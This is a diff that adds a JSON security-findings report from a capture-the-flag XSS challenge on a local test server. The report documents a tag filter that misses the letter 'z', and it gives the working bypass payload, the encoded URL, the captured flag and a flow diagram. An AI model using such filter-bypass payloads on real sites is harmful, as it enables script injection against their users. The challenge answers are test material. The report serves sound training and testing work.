@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:52:51.778056+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "a37884ec-2955-4cae-8e5a-82a96a2ea28f",
+      "timestamp": "2026-04-12T21:52:51.777945+00:00",
+      "title": "XSS Filter Bypass via Off-by-One Character Range (tag 'z'/'Z')",
+      "severity": "critical",
+      "target": "http://172.17.0.1:50665/page",
+      "description": "The XSS filter on the 'name' GET parameter blocks tags starting with letters <a-y> and <A-Y> plus </. However, it has an off-by-one error and does NOT block the letter 'z' or 'Z' after <. This allows injecting arbitrary HTML elements using the tag name 'z' (e.g., <z onfocus=alert('XSS') autofocus>). The autofocus attribute causes the element to receive focus automatically on page load, triggering the onfocus event handler.",
+      "evidence": "Payload: <z onfocus=alert('XSS') autofocus>\nURL: http://172.17.0.1:50665/page?name=%3Cz+onfocus%3Dalert%28%27XSS%27%29+autofocus%3E\n\nFLAG: flag{9541cc02-59a2-4171-8d30-5530ec31d825}\n\nServer response includes: 'Congratulations! Here is the flag: flag{9541cc02-59a2-4171-8d30-5530ec31d825}'\n\nFilter analysis:\n- <a> through <y> = BLOCKED\n- <A> through <Y> = BLOCKED\n- </  = BLOCKED\n- <z> = PASSED (off-by-one error)\n- <Z> = PASSED (off-by-one error)",
+      "tool_used": "manual",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "18859e45-121d-4802-ab2a-384f331e9ece",
+      "timestamp": "2026-04-12T21:53:06.804569+00:00",
+      "title": "Dalgona XSS Challenge Architecture",
+      "mermaid": "flowchart TD\n    Browser[\"Browser (User)\"] --> GET[\"GET /page?name=PAYLOAD\"]\n    GET --> Filter{\"XSS Filter\\n(blocks <a-y> but NOT <z>)\"}\n    Filter -->|\"<a-y> found\"| Blocked[\"Sorry, you can't use that tag\"]\n    Filter -->|\"No XSS found\"| Failed[\"Failed! Try again!\"]\n    Filter -->|\"Valid XSS detected\"| Success[\"Congratulations + FLAG\"]\n    Success --> Flag[\"flag{9541cc02-59a2-4171-8d30-5530ec31d825}\"]\n    GET --> Template[\"Flask Template\\n<input ...> VALUE>\"]\n    Template --> ReflectCtx[\"Reflection: HTML text node\\nafter <input> element\"]"
+    }
+  ]
+}
